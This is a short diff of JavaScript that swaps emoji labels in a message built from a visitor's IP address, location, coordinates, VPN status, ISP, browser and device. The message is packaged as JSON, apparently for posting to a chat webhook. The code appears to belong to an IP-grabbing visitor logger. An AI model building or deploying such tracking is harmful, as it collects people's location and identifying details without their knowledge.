@@ -67,21 +67,21 @@
         };
 
         const messageContent = `**${emojis.location} IP Address:** ${data.ip_address}\n` +
-            `**${emojis.location} Current URL:** ${data.current_url}\n` +
-            `**${emojis.location} City:** ${data.city}\n` +
-            `**${emojis.location} Region:** ${data.region}\n` +
-            `**${emojis.location} Country:** ${data.country} (${data.country_code})\n` +
-            `**${emojis.location} Continent:** ${data.continent} (${data.continent_code})\n` +
-            `**${emojis.location} Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
-            `**${emojis.vpn} VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
-            `**${emojis.location} Flag:** ${data.flag}\n` +
-            `**${emojis.location} ISP:** ${data.isp_name}\n` +
-            `**${emojis.calendar} Date:** ${data.date}\n` +
-            `**${emojis.calendar} Day:** ${data.day}\n` +
-            `**${emojis.clock} Time:** ${data.time}\n` +
-            `**${emojis.link} Referring URL:** ${data.referringURL}\n` +
-            `**${emojis.computer} Browser:** ${data.browser}\n` +
-            `**${emojis.computer} Device:** ${data.device}`;
+            `**🔗 Current URL:** ${data.current_url}\n` +
+            `**🏘️ City:** ${data.city}\n` +
+            `**🏞️ Region:** ${data.region}\n` +
+            `**🌐 Country:** ${data.country} (${data.country_code})\n` +
+            `**🌍 Continent:** ${data.continent} (${data.continent_code})\n` +
+            `**"🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
+            `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
+            `**🇳🇱 Flag:** ${data.flag}\n` +
+            `**🏢 ISP:** ${data.isp_name}\n` +
+            `**📅 Date:** ${data.date}\n` +
+            `**📆 Day:** ${data.day}\n` +
+            `**⌚ Time:** ${data.time}\n` +
+            `**🌐 Referring URL:** ${data.referringURL}\n` +
+            `**🌐 Browser:** ${data.browser}\n` +
+            `**💻 Device:** ${data.device}`;
 
         const message = JSON.stringify({ content: messageContent });
 
